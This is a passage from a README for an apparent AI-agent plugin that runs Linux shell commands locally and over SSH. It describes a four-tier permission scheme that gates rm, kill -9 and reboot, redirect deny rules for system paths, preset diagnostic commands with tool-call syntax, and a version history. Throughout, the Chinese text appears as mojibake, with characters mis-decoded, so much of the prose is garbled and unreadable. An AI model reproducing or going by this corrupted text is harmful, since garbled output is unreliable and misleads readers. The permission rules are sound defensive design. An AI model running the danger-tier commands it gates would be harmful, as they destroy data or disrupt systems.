grep -r "error" /var/log    # âœ“
ps aux                      # âœ“
df -h                       # âœ“
```

## ç›®å½•ç»“æ„

```
Plugin/LinuxShellExecutor/
â”œâ”€â”€ LinuxShellExecutor.js    # ä¸»æ‰§è¡Œå™¨
â”œâ”€â”€ plugin-manifest.json     # æ’ä»¶é…ç½®
â”œâ”€â”€ config.env               # å®‰å…¨ç­–ç•¥é…ç½®
â”œâ”€â”€ securityLevels.json      # ğŸ†• å››çº§å®‰å…¨åˆ†çº§é…ç½®
â”œâ”€â”€ presets.json# ğŸ†• é¢„è®¾è¯Šæ–­å‘½ä»¤é…ç½®
â”œâ”€â”€ whitelist.json           # ç™½åå•é…ç½®ï¼ˆå…éªŒè¯å‘½ä»¤ï¼‰
â”œâ”€â”€ graylist.json            # ç°åå•é…ç½®ï¼ˆéœ€éªŒè¯å‘½ä»¤ï¼‰
â”œâ”€â”€ hosts.json               # ä¸»æœºé…ç½®
â”œâ”€â”€ README.md                # ä½¿ç”¨æ–‡æ¡£
â”œâ”€â”€ ssh/
â”‚   â””â”€â”€ SSHManager.js        # SSH è¿æ¥ç®¡ç†å™¨
â””â”€â”€ logs/
    â””â”€â”€ audit/               # å®¡è®¡æ—¥å¿—ç›®å½•
```

## å››çº§å®‰å…¨åˆ†çº§è¯¦è§£ (v0.4.0)

| çº§åˆ« | è¯´æ˜ | ç®¡é“ | é‡å®šå‘ | éªŒè¯è¦æ±‚ | ç¤ºä¾‹å‘½ä»¤ |
|------|------|------|--------|----------|----------|
| `read` | åªè¯»å‘½ä»¤ | âœ… | âŒ | æ— éœ€éªŒè¯ | ls, cat, grep, ps, df, free |
| `safe` | ä½é£é™©å‘½ä»¤ | âœ… | âŒ | æ— éœ€éªŒè¯ | systemctl status, docker ps |
| `write` | å†™æ“ä½œå‘½ä»¤ | âœ… | âœ… | éœ€è¦éªŒè¯ | echo, tee, systemctl restart |
| `danger` | é«˜å±å‘½ä»¤ | âŒ | âŒ | äºŒæ¬¡ç¡®è®¤ | rm, kill -9, reboot |

### ç®¡é“é“¾è§„åˆ™

åªå…è®¸ä»¥ä¸‹å®‰å…¨çº§åˆ«ç»„åˆçš„ç®¡é“é“¾ï¼š
- `read â†’ read`ï¼ˆå¦‚ `ps aux | grep nginx`ï¼‰
- `read â†’ safe`ï¼ˆå¦‚ `cat log | head -100`ï¼‰
- `safe â†’ read`ï¼ˆå¦‚ `docker logs | grep error`ï¼‰

### é‡å®šå‘è§„åˆ™

- åªæœ‰ `write` çº§åˆ«å‘½ä»¤å…è®¸ä½¿ç”¨é‡å®šå‘
- å…è®¸çš„ç›®æ ‡è·¯å¾„ï¼š`/tmp/*`, `/var/log/*`, `~/*`
- ç¦æ­¢çš„ç›®æ ‡è·¯å¾„ï¼š`/etc/*`, `/bin/*`, `/sbin/*`, `/usr/*`

## é¢„è®¾è¯Šæ–­å‘½ä»¤ (v0.4.0)

### å¯ç”¨é¢„è®¾åˆ—è¡¨

| é¢„è®¾å | è¯´æ˜ | å‚æ•° |
|--------|------|------|
| `quickDiag` | å¿«é€Ÿç³»ç»Ÿè¯Šæ–­ | æ—  |
| `checkService` | æ£€æŸ¥æœåŠ¡çŠ¶æ€ | serviceName (å¿…éœ€) |
| `netDiag` | ç½‘ç»œè¯Šæ–­ | æ—  |
| `checkDisk` | ç£ç›˜è¯¦ç»†æ£€æŸ¥ | æ—  |
| `checkDocker` | Docker çŠ¶æ€æ£€æŸ¥ | containerName (å¯é€‰) |
| `checkMysql` | MySQL çŠ¶æ€æ£€æŸ¥ | æ—  |
| `checkRedis` | Redis çŠ¶æ€æ£€æŸ¥ | æ—  |
| `checkNginx` | Nginx çŠ¶æ€æ£€æŸ¥ | æ—  |
| `securityAudit` | å®‰å…¨å®¡è®¡ | æ—  |
| `performanceCheck` | æ€§èƒ½æ£€æŸ¥ | æ—  |
| `logAnalysis` | æ—¥å¿—åˆ†æ | logFile (å¿…éœ€), pattern (å¯é€‰) |
| `processTree` | è¿›ç¨‹æ ‘æŸ¥çœ‹ | æ—  |

### é¢„è®¾å‘½ä»¤è°ƒç”¨ç¤ºä¾‹

```
# å¿«é€Ÿç³»ç»Ÿè¯Šæ–­
<<<[TOOL_REQUEST]>>>
tool_name:ã€Œå§‹ã€LinuxShellExecutorã€Œæœ«ã€,
command:ã€Œå§‹ã€preset:quickDiagã€Œæœ«ã€
<<<[END_TOOL_REQUEST]>>>

# æ£€æŸ¥ nginx æœåŠ¡
<<<[TOOL_REQUEST]>>>
tool_name:ã€Œå§‹ã€LinuxShellExecutorã€Œæœ«ã€,
command:ã€Œå§‹ã€preset:checkService?serviceName=nginxã€Œæœ«ã€
<<<[END_TOOL_REQUEST]>>>

# åˆ†ææ—¥å¿—æ–‡ä»¶
<<<[TOOL_REQUEST]>>>
tool_name:ã€Œå§‹ã€LinuxShellExecutorã€Œæœ«ã€,
command:ã€Œå§‹ã€preset:logAnalysis?logFile=/var/log/syslog&pattern=errorã€Œæœ«ã€
<<<[END_TOOL_REQUEST]>>>

# åˆ—å‡ºæ‰€æœ‰é¢„è®¾
<<<[TOOL_REQUEST]>>>
tool_name:ã€Œå§‹ã€LinuxShellExecutorã€Œæœ«ã€,
action:ã€Œå§‹ã€listPresetsã€Œæœ«ã€
<<<[END_TOOL_REQUEST]>>>
```

## è¾“å‡ºæ ¼å¼åŒ– (v0.4.0)

### è¾“å‡ºæ ¼å¼é€‰é¡¹

| æ ¼å¼ | è¯´æ˜ |
|------|------|
| `raw` | åŸå§‹è¾“å‡ºï¼Œä¸åšä»»ä½•å¤„ç† |
| `formatted` | æ ¼å¼åŒ–è¾“å‡ºï¼ˆé»˜è®¤ï¼‰ï¼Œè‡ªåŠ¨æˆªæ–­ã€è¡¨æ ¼ç¾åŒ– |
| `json` | JSON æ ¼å¼è¾“å‡ºï¼Œä¾¿äºç¨‹åºè§£æ |

### è‡ªåŠ¨æˆªæ–­

- é»˜è®¤æœ€å¤§è¾“å‡ºè¡Œæ•°ï¼š100 è¡Œ
- è¶…è¿‡é™åˆ¶æ—¶è¿”å› `truncated: true`
- å®Œæ•´è¾“å‡ºä¿å­˜åˆ°ä¸´æ—¶æ–‡ä»¶ï¼Œè¿”å› `fullOutputPath`

### è¡¨æ ¼ç¾åŒ–

è‡ªåŠ¨è¯†åˆ«å¹¶ç¾åŒ–ä»¥ä¸‹å‘½ä»¤çš„è¡¨æ ¼è¾“å‡ºï¼š
- `ps`ã€`docker ps`ã€`df`ã€`free`ã€`netstat`ã€`ss`

## ç‰ˆæœ¬å†å²

- **v0.4.0** - å››çº§å®‰å…¨åˆ†çº§ã€é¢„è®¾å‘½ä»¤ã€è¾“å‡ºæ ¼å¼åŒ–
  - æ–°å¢å››çº§å®‰å…¨åˆ†çº§ï¼ˆread/safe/write/dangerï¼‰
  - æ–°å¢æ™ºèƒ½ç®¡é“é“¾éªŒè¯
  - æ–°å¢ 12 ä¸ªé¢„è®¾è¯Šæ–­å‘½ä»¤
  - æ–°å¢è¾“å‡ºæ ¼å¼åŒ–ï¼ˆè‡ªåŠ¨æˆªæ–­ã€è¡¨æ ¼ç¾åŒ–ï¼‰
  - æ–°å¢ securityLevels.json å’Œ presets.json é…ç½®æ–‡ä»¶
- **v0.3.1** - æ–°å¢ä¸‰çº§æƒé™æ§åˆ¶ï¼ˆç™½åå•/ç°åå•/é»‘åå•ï¼‰
  - ç™½åå•å‘½ä»¤æ— éœ€éªŒè¯å³å¯æ‰§è¡Œ
  - ç°åå•å‘½ä»¤éœ€è¦ç®¡ç†å‘˜éªŒè¯ç 
  - æ–°å¢ graylist.json é…ç½®æ–‡ä»¶ï¼ŒåŒ…å«è¿ç»´å‘½ä»¤
  - æ”¯æŒ systemctlã€dockerã€killã€journalctl ç­‰è¿ç»´å‘½ä»¤
- **v0.3.0** - æ–°å¢èµ„æºé™åˆ¶(rlimit)ã€ç®¡é“å‘½ä»¤éªŒè¯ã€SSHè¿æ¥æ± ä¼˜åŒ–
  - å®ç° RlimitManager ç±»ï¼Œæ”¯æŒ CPU/å†…å­˜/æ–‡ä»¶/è¿›ç¨‹æ•°é™åˆ¶
  - å®ç°ç®¡é“å‘½ä»¤è§£æå’ŒéªŒè¯ï¼Œæ”¯æŒ allowedPipeCommands å’Œ forbiddenInPipe
  - SSH è¿æ¥æ± å¢åŠ è¿æ¥æ•°é‡é™åˆ¶ã€è‡ªåŠ¨é‡è¯•ã€ç­‰å¾…é˜Ÿåˆ—
- **v0.2.0** - æ–°å¢å¤šä¸»æœº SSH è¿œç¨‹æ‰§è¡Œã€å¯†é’¥è®¤è¯ã€è·³æ¿æœºæ”¯æŒ
- **v0.1.0** - åˆå§‹ç‰ˆæœ¬ï¼Œå®ç°å…­å±‚å®‰å…¨æ¶æ„

## è®¸å¯è¯

MIT License